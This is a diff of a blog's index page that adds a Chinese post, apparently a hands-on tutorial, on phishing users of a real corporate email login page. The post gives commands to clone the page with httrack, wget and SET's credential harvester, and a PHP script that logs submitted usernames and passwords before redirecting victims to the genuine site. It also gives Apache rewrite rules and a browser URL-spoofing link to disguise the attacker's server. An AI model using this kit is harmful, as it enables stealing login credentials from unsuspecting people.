@@ -154,6 +154,131 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-愉快地进行网站钓鱼" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/28/愉快地进行网站钓鱼/">愉快地进行网站钓鱼</a>
+    </h1>
+  
+
+
+<!-- 显示阅读数 -->
+
+
+
+        
+        <a href="/2018/04/28/愉快地进行网站钓鱼/" class="archive-article-date">
+  	<time datetime="2018-04-28T05:14:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-28</time>
+</a>
+        
+      </header>
+    
+    <!-- 目录内容 -->
+
+<!-- 目录内容结束 -->
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<h4 id="0x0、让网站看起来一模一样"><a href="#0x0、让网站看起来一模一样" class="headerlink" title="0x0、让网站看起来一模一样"></a>0x0、让网站看起来一模一样</h4><p>寻找钓鱼目标网站<br>安装克隆工具（kali自带，不用装）<br>apt-get install httrack</p>
+<blockquote>
+<p>wget -r -P test/ <a href="http://abc.com/login/" target="_blank" rel="noopener">http://abc.com/login/</a><br>  也可以克隆网站,https加上 –no-check-certificate 参数</p>
+</blockquote>
+<p>可以直接使用使用httrack一步步跟着提示来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Welcome to HTTrack Website Copier (Offline Browser) 3.48-23</span><br><span class="line">Copyright (C) 1998-2016 Xavier Roche and other contributors</span><br><span class="line">To see the option list, enter a blank line or try httrack --help</span><br><span class="line"></span><br><span class="line">Enter project name :test2</span><br><span class="line"></span><br><span class="line">Base path (return=/root/websites/) :</span><br><span class="line"></span><br><span class="line">Enter URLs (separated by commas or blank spaces) :https://qiye.163.com/login/</span><br><span class="line"></span><br><span class="line">Action:</span><br><span class="line">(enter)	1	Mirror Web Site(s)</span><br><span class="line">	2	Mirror Web Site(s) with Wizard</span><br><span class="line">	3	Just Get Files Indicated</span><br><span class="line">	4	Mirror ALL links in URLs (Multiple Mirror)</span><br><span class="line">	5	Test Links In URLs (Bookmark Test)</span><br><span class="line">	0	Quit</span><br><span class="line">: 2</span><br><span class="line"></span><br><span class="line">Proxy (return=none) :</span><br><span class="line"></span><br><span class="line">You can define wildcards, like: -*.gif +www.*.com/*.zip -*img_*.zip</span><br><span class="line">Wildcards (return=none) :-*.gif</span><br><span class="line"></span><br><span class="line">You can define additional options, such as recurse level (-r&lt;number&gt;), separated by blank spaces</span><br><span class="line">To see the option list, type help</span><br><span class="line">Additional options (return=none) :</span><br><span class="line"></span><br><span class="line">---&gt; Wizard command line: httrack https://qiye.163.com/login/ -W -O &quot;/root/websites/test2&quot;  -%v  -*.gif</span><br><span class="line"></span><br><span class="line">Ready to launch the mirror? (Y/n) :</span><br><span class="line"></span><br><span class="line">WARNING! You are running this program as root!</span><br><span class="line">It might be a good idea to run as a different user</span><br><span class="line">Mirror launched on Thu, 14 Jul 2016 21:12:13 by HTTrack Website Copier/3.48-23 [XR&amp;CO&apos;2014]</span><br><span class="line">mirroring https://qiye.163.com/login/ -*.gif with the wizard help..</span><br><span class="line">Done.</span><br><span class="line">Thanks for using HTTrack!</span><br><span class="line">*</span><br></pre></td></tr></table></figure>
+<p>熟悉的话，也可以直接输入一条命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httrack &quot;http://xxx.blog.163.com&quot; -O /home/web/test/  &quot;+*.xxx.blog.163.com/*&quot; -v</span><br></pre></td></tr></table></figure></p>
+<p>“+<em>.xxx.blog.163.com/</em>“ 表示以 “*.xxx.blog.163.com/“ 开头的所有页面</p>
+<h4 id="0x1、钓到的数据不保存不行"><a href="#0x1、钓到的数据不保存不行" class="headerlink" title="0x1、钓到的数据不保存不行"></a>0x1、钓到的数据不保存不行</h4><p>&emsp;&emsp;kali下的 <code>setooit</code> 为执行针对人性的攻击而设计。这类攻击包括网络钓鱼、邮件群发、SMS、伪造无线接入点、恶意网站、感染性媒体，以及其它。<br>此款工具提供了自动克隆网页和保存表单的操作，具体步骤如下：</p>
+<blockquote>
+<p>在set&gt;提示符中输入1（Social-Engineering Attacks）并按下回车。<br>现在选择Website Attack Vectors（选项2）。<br>从下面的菜单中，我们选择Credential Harvester Attack Method（选项3）。<br>选择Site Cloner（选项2）。<br>它会询问IP address for the POST back in Harvester/Tabnabbing。它的意思是收集到的证书打算发送到哪个 IP。这里，我们输入 Kali 主机在vboxnet0中的 IP 172.16.17.86。<br>下面，询问要克隆的 URL，输入<a href="https://qiye.163.com/login/。" target="_blank" rel="noopener">https://qiye.163.com/login/。</a><br>现在会开始克隆，之后你会被询问是否 SET 要开启 Apache 服务器，让我们这次选择Yes，输入y并按下回车。</p>
+</blockquote>
+<p>在本人的实验中，使用<code>setooit</code>进行钓鱼的效果不尽人意，而且该工具对很多网站的克隆是失败的。所以参考这个工具的保存数据方法，使用php来保存post表单的数据：</p>
+<p>创建post.php：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = &quot;log.txt&quot;;   //在linux系统请确认这个文本有写入权限</span><br><span class="line">$password = $_POST[&apos;Password&apos;];</span><br><span class="line">$userid = $_POST[&apos;UserId&apos;];</span><br><span class="line">//file_put_contents($file, print_r($_POST, true), FILE_APPEND); 此为setooit的保存方法</span><br><span class="line">file_put_contents($file, $userid.&quot;   &gt;&gt;&gt;  &quot;.$password.&quot;\n&quot;, FILE_APPEND);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1; url=http://qiye.163.com/login/&quot; /&gt; </span><br><span class="line">&lt;!-- 跳回真正的登陆页面，一般用户不会留意这个跳转有问题，反正密码都获到了 --&gt;</span><br></pre></td></tr></table></figure>
+<p>修改克隆的html中的form表单：<br><code>&lt;form id=&quot;loginContent&quot; class=&quot;login_content&quot; action=&quot;http://172.16.17.86/post.php&quot; method=&quot;post&quot;&gt;</code></p>
+<p>把log.txt、post.php、index.html页面放到apache的/var/www/html中，开启apache服务，即可。</p>
+<h4 id="0x3、让链接看起来更像"><a href="#0x3、让链接看起来更像" class="headerlink" title="0x3、让链接看起来更像"></a>0x3、让链接看起来更像</h4><p>我们的服务器地址是 172.16.17.86，要是直接让受害者访问 <code>http://172.16.17.86/index.html</code>这种，迷惑性几乎为0，也很容易引起受害者的怀疑。所以必须让链接变成和真实域名差不多的样子。<br>这里有几种方法，购买域名、<a href="http://www.mingczh.com/newsinfo.aspx?NewsID=540" target="_blank" rel="noopener">自搭Dnsmasq</a> 、修改服务器的hosts共享wifi。<br>据实际考量，上述的几种方法都不是很适合本次的实验。<br>故另辟路径，结合浏览器的网址欺诈漏洞，可以生成诱惑性强的链接<br>1、 找到apache配置文件/etc/apache2/apache2.conf，增加两行记录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AliasMatch ^/post.php /var/www/html/post.php</span><br><span class="line">AliasMatch ^/.* /var/www/html/index.html</span><br></pre></td></tr></table></figure>
+<p>然后重启apache</p>
+<blockquote>
+<p>所有的请求都交给index.html这样做有一个好处，当资源不存在的时候，也会转到首页。<br>在html提交表单的时候会调用post.php，故应该把post.php的请求放在首位。</p>
+</blockquote>
+<p>2、<br>构造下谷歌浏览器的链接：<br><code>http://172.16.17.86/%EF%B9%B0/http://www.hacker.com/seesionid/WsssXN201608s19008500041?refer=www.hacker.com&amp;cur_pos=1&amp;_wv=1&amp;_rp=1&amp;bkt=0&amp;ssid=WXN2ss01608190085000wwww41</code><br>你可以随便增加一些参数之类使链接看起来更真实。</p>
+<p>可以见到，浏览器访问的是172.16.17.86，但是链接显示是<code>http://www.hacker.com/seesionid/WsssXN201608s19008500041?refer=www.hacker.com&amp;cur_pos=1&amp;_wv=1&amp;_rp=1&amp;bkt=0&amp;ssid=WXN2ss01608190085000wwww41</code> 迷惑性是不是好强呢</p>
+<p><img src="http://p2or7ktgu.bkt.clouddn.com/WX20180428-154441.png" alt="WX20180428-154441"></p>
+<h4 id="0x4、-题外话"><a href="#0x4、-题外话" class="headerlink" title="0x4、 题外话"></a>0x4、 题外话</h4><p>要是能够配合url重定向漏洞进行钓鱼，隐密性会更强哦。</p>
+<blockquote>
+<p>参考链接：<br><a href="http://lib.csdn.net/article/linux/58271?knId=1293" target="_blank" rel="noopener">客户端攻击和社会工程</a><br><a href="https://www.anquanke.com/post/id/84446" target="_blank" rel="noopener">Chrome地址反转漏洞应用案例</a><br><a href="http://www.freebuf.com/vuls/112259.html" target="_blank" rel="noopener">网址欺诈漏洞</a></p>
+</blockquote>
+
+      
+
+
+
+      
+
+
+
+
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">钓鱼</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/04/28/愉快地进行网站钓鱼/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-搭建dnslog服务器检测盲注和命令注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -652,11 +777,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">经验</a>
+                <a href="javascript:void(0)" class="js-tag color2">dnslog</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">dnslog</a>
+                <a href="javascript:void(0)" class="js-tag color3">钓鱼</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">经验</a>
               </li>
             
             <div class="clearfix"></div>
